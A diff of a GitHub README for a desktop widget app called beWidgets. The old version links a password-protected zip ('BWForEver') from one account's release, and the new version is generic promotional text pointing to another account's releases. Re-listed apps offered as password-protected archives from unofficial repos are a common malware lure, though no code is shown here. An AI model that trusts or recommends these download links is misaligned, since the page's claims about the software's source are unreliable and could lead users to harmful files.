@@ -1,38 +1,39 @@
-<div align="center"><img src="https://img.utdstc.com/icon/9ad/ae1/9adae1fc8211b04701443bf324f4cd0fd013e54930fee63799e4624989205b0c:100"></div>
-<h1 align="center">BeWidgets</h1>
-<p align="center"><b>Create your personalized and fully customizable modern widgets on your desktop</b></p>
-<hr>
-<h2>Download</h2>
-<ul>
-  <li><b>Download BeWidgets</b> <i>(Password: BWForEver)</i></li>
-  <br>
-  <a href="https://github.com/havanagilla1/beWidgets/releases/download/Download/beWidgets.zip"><img src="https://github.com/user-attachments/assets/347a1f2c-3216-4c75-aac1-5cf3063b0665"></a>
-</ul>
-<h2>Screenshots</h2>
-<img src="https://github.com/user-attachments/assets/be88c92f-93ef-4110-87d6-5bfddea6cff2">
-<img src="https://github.com/user-attachments/assets/04858915-b4d5-4adf-a7d0-bfe601500247">
-<img src="https://github.com/user-attachments/assets/212dc633-da1f-4469-a444-9d86c7362fa9">
-<img src="https://github.com/user-attachments/assets/c90df0ab-ea7d-4ffb-849f-33bd9cb65efc">
-<img src="https://github.com/user-attachments/assets/28434761-2675-4dde-ba16-59c003a9b4ad">
-<img src="https://github.com/user-attachments/assets/84bc5b91-5cbc-4ec5-8c5d-7c16af8d6ce0">
-<img src="https://github.com/user-attachments/assets/01fc3aed-7641-4b95-b458-5c551d41e259">
-<h2>Description</h2>
-<p>Create your personalized and fully customizable modern widgets on your desktop! We use modern design and easy to use user interface. You can create time, date, financial, photos, application shortcut and weather widgets.</p>
-<h2>Features</h2>
-<ul>
-  <li>Customize every part of your widget.</li>
-  <li>Large variety of widgets.</li>
-  <li>Fast and optimized.</li>
-  <li>New updates every week.</li>
-  <li>Modern environment like in Windows 11 style.</li>
-  <li>Light and dark theme.</li>
-  <li>Switch between your favourite layouts.</li>
-</ul>
-<h2>System Requirements</h2>
-<ul>
-  <li><b>Available on:</b> PC, Surface Hub, HoloLens</li>
-  <li><b>OS:</b> Windows 10 version 14393.0 or higher</li>
-  <li><b>Keyboard:</b> Integrated Keyboard</li>
-  <li><b>Mouse:</b> Integrated Mouse</li>
-  <li><b>Memory:</b> 2 GB <i>(Minimum)</i>, 4 GB <i>(Recommended)</i></li>
-</ul>
+# beWidgets: Create Your Customizable Desktop Widgets
+
+Welcome to beWidgets, the ultimate tool for creating personalized and fully customizable modern widgets for your desktop. With beWidgets, you can enhance your desktop experience by adding beautiful and functional widgets tailored to your preferences. Whether you're looking to stay organized, keep track of important information, or simply add a touch of style to your desktop, beWidgets has got you covered.
+
+## Features
+
+🖥️ **Customizable Widgets**: Personalize your widgets to suit your unique style and needs. Choose from a variety of designs, colors, and functionalities to create the perfect widget for you.
+
+🌈 **Beautiful Designs**: Enjoy a collection of stunning widget designs that will elevate the look of your desktop. From minimalist to vibrant, there's a design for every taste.
+
+🔧 **Easy to Use**: beWidgets is user-friendly and intuitive, making it easy for anyone to create and customize widgets without any hassle.
+
+## Installation
+
+To get started with beWidgets, simply [download the latest release](https://github.com/Shadrack12/beWidgets/releases) from the link provided. Once downloaded, follow the on-screen instructions to set up beWidgets on your desktop.
+
+## Compatibility
+
+beWidgets is compatible with Windows operating systems, including Windows 10 and Windows 11. The widgets are designed to seamlessly integrate with your desktop environment, providing a smooth and enjoyable user experience.
+
+## Getting Started
+
+After installing beWidgets, explore the various widget options available and start customizing them to your liking. Whether you need a weather widget, a to-do list, a calendar, or any other type of widget, beWidgets has everything you need to stay organized and informed.
+
+## Contributing
+
+If you're a developer or designer interested in contributing to beWidgets, feel free to explore the [source code](https://github.com/Shadrack12/beWidgets) on GitHub. Your contributions are welcome and will help improve the functionality and design of beWidgets for all users.
+
+## Support
+
+For any questions, issues, or feedback regarding beWidgets, please visit the [GitHub repository](https://github.com/Shadrack12/beWidgets) or check the "Releases" section for updates and troubleshooting information.
+
+---
+
+[![Download beWidgets](https://img.shields.io/badge/Download-beWidgets-brightgreen)](https://github.com/Shadrack12/beWidgets/releases)
+
+---
+
+By choosing beWidgets, you're taking the first step towards enhancing your desktop experience with beautiful and functional widgets. Experience the convenience and style that beWidgets brings to your desktop today.	Create your personalized and fully customizable modern widgets on your desktop with beWidgets. 🌟
